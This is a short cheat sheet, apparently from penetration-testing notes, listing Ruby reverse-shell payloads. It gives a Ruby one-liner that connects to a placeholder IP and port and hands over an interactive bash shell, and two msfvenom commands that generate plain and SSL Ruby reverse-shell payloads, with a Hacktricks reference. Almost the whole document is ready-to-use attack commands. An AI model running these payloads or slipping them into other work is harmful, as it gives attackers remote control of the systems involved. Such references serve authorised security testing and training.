# Ruby

## 01 - One-liners

```ruby
$ ruby -rsocket -e'f=TCPSocket.open("<IP>", <PORT>).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

## 02 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_ruby lhost=<IP> lport=<PORT>

$ msfvenom -p cmd/unix/reverse_ruby_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/shells/shells/linux.html)